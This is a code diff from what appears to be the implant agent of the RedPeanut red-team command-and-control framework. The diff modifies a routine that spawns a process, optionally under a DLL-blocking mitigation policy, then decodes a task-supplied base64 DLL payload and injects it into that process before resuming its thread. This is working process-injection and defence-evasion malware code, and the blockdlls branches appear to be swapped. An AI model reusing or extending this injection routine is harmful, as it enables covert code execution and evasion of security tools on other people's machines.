@@ -175,7 +175,17 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
+        public void ExecuteModuleUnManagedBlockDll()
+        {
+            ExecuteModuleUnManaged(true);
+        }
+
         public void ExecuteModuleUnManaged()
+        {
+            ExecuteModuleUnManaged(false);
+        }
+
+        public void ExecuteModuleUnManaged(bool blockdlls)
         {
 
             string output = "";
@@ -188,15 +198,25 @@ namespace RedPeanutAgent.Execution
             }
 
             Core.Natives.PROCESS_INFORMATION procInfo = new Core.Natives.PROCESS_INFORMATION();
-            if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+            if (blockdlls)
             {
-                return;
+                if (!Spawner.CreateProcess(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+                {
+                    return;
+                }
+            }
+            else
+            {
+                if (!Spawner.CreateProcessPCMPBNMBSAO(hReadPipe, hWritePipe, this.processname, true, ref procInfo))
+                {
+                    return;
+                }
             }
 
             string pipename = GetPipeName(procInfo.dwProcessId);
             InjectionLoaderListener injectionLoaderListener = new InjectionLoaderListener(pipename, task);
 
-            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(worker.nutclr));
+            byte[] payload = Core.Utility.DecompressDLL(Convert.FromBase64String(task.ModuleTask.Assembly));
 
             //Round payload size to page size
             uint size = InjectionHelper.GetSectionSize(payload.Length);
@@ -241,11 +261,7 @@ namespace RedPeanutAgent.Execution
                 return;
             }
 
-            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
-            if (infoth == IntPtr.Zero)
-            {
-                return;
-            }
+            InjectionHelper.SetInformationThread(procInfo);
 
             InjectionHelper.ResumeThread(procInfo);
 
